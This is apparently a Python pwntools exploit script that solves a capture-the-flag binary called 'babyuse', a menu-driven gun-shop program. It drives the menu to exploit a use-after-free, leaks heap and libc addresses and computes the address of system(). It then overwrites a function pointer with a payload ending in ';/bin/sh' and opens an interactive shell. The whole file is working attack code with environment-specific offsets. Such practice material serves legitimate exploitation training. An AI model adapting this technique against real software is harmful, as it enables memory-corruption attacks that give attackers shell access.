#!/usr/bin/env python
# coding=utf-8

# buy_addr = 0x56556300 + 0x1211 = 0x56557511

from pwn import *

slog = 0
debug = 1
local = 1

p = process('./babyuse')
libc = ELF('/lib32/libc.so.6')


if slog: context.log_level = 'DEBUG'


def buy(gun_type, length, name):
    p.recvuntil('7. Exit')
    p.sendline('1')
    p.recvuntil('2. QBZ95')
    p.sendline(str(gun_type))
    p.recvuntil('Lenth of name：')
    p.sendline(str(length))
    p.recvuntil('Input name:')
    p.sendline(name)

def drop(index):
    p.recvuntil('7. Exit')
    p.sendline('6')
    p.recvuntil('Choose a gun to delete:')
    p.sendline(str(index))

def select(index):
    p.recvuntil('7. Exit')
    p.sendline('2')
    p.recvuntil('Select a gun')
    p.sendline(str(index))

def use(option):
    p.recvuntil('7. Exit')
    p.sendline('5')
    p.recvuntil('4. Main menu')
    p.sendline(str(option))

def rename(index, length, name):
    p.recvuntil('7. Exit')
    p.sendline('4')
    p.recvuntil('Choose a gun to rename:')
    p.sendline(str(index))
    p.recvuntil('Lenth of name：')
    p.sendline(str(length))
    p.recvuntil('Input name:')
    p.sendline(name)



buy(2, 0x50, 'a' * 0x50) # buy = 1, 0x50=80
buy(1, 0x60, 'b' * 0x60) # 96
buy(1, 0x8, 'c' * 0x8)
buy(1, 0x8, 'd' * 0x8)

# s= raw_input()
select(2)       #select=2
drop(0)         #drop = 6
drop(1)
drop(2)
print("dropped No.2")

drop(3)
print("dropped No.3")


buy(1, 0x20000, 'h' * 0x20000) #  large_bin to invoke unlink
print("Merged")


p.recvuntil('7. Exit')
p.sendline('5')             # USE
p.recvuntil('Select gun ')
leak_heap = u32(p.recv(4))
# s = raw_input()
print 'leak_heap addr is', hex(leak_heap)

p.recvuntil('4. Main menu')
p.sendline('4')         #rename

heap_base = leak_heap - 0x18
buy(1, 0xf4, 'j' * 0xdc + p32(heap_base + 0x114))



p.recvuntil('7. Exit')
p.sendline('5')
p.recvuntil('Select gun ')

leak_libc = u32(p.recv(4))
print 'leak_libc addr is', hex(leak_libc)

libc_base = leak_libc - 0x1b37b0
system_addr = libc_base + libc.symbols['system'] + 0xa360


print 'sytem addr is ', hex(system_addr) # 0xf7d5c3e0  ?? 0xf7d52080

p.recvuntil('4. Main menu')
p.sendline('4') # Back to main menu

dummy_addr = leak_libc # any valid addr
drop(1)    
payload = ('aaaa' + p32(system_addr)).ljust(0xd8, 'a') + p32(heap_base + 0x20) + p32(dummy_addr) + ";/bin/sh" 
buy(1, 0xf4, payload)

# [DEBUG] Sent 0xe9 bytes:
#     00000000  2f 73 68 00  e0 c3 d5 f7  61 61 61 61  61 61 61 61  │/sh·│····│aaaa│aaaa│
#     00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
#     *
#     000000d0  61 61 61 61  61 61 61 61  20 a0 55 56  14 a1 55 56  │aaaa│aaaa│ ·UV│··UV│
#     000000e0  3b 2f 62 69  6e 2f 73 68  0a                        │;/bi│n/sh│·│

gdb.attach(p, '''
    ''')

p.recvuntil('7. Exit')
p.sendline('5') # use_gun
p.recvuntil('4. Main menu')
p.sendline('2') # reload

p.interactive()
